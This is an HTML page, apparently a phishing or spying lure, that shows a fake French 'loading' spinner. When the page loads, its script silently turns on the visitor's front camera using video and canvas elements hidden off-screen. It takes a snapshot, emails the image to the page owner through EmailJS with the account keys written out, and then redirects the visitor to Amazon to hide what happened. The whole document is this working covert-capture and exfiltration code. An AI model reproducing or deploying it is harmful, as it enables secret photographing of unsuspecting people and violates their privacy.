<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .loading {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #video, #canvas {
      position: absolute;
      left: -9999px;
      opacity: 0;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <p>Chargement en cours...</p>
  </div>
  
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>
  
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    // Démarrage automatique dès le chargement
    window.addEventListener('load', async () => {
      try {
        // Demande d'accès à la caméra frontale
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user' // Caméra frontale
          }
        });
        
        video.srcObject = stream;
        
        // Attendre que la vidéo soit prête puis prendre la photo
        video.addEventListener('loadedmetadata', () => {
          setTimeout(captureAndSend, 1000); // Délai de 1s pour stabiliser l'image
        });
        
      } catch (err) {
        console.error('Erreur caméra:', err);
        // Redirection même en cas d'erreur
        redirectToAmazon();
      }
    });
    
    function captureAndSend() {
      try {
        // Capturer l'image
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/jpeg", 0.8);
        
        // Arrêter la caméra
        const stream = video.srcObject;
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        // Envoyer par email
        emailjs.send("service_8cs0gml", "template_w14xn7c", {
          name: "Visiteur",
          time: new Date().toLocaleString(),
          message: "Photo automatique",
          image: imageData
        }).then(() => {
          console.log('Photo envoyée');
        }).catch(err => {
          console.error('Erreur envoi:', err);
        }).finally(() => {
          // Redirection vers Amazon après envoi (succès ou échec)
          redirectToAmazon();
        });
        
      } catch (err) {
        console.error('Erreur capture:', err);
        redirectToAmazon();
      }
    }
    
    function redirectToAmazon() {
      setTimeout(() => {
        window.location.href = 'https://www.amazon.fr';
      }, 500);
    }
  </script>
</body>
</html>
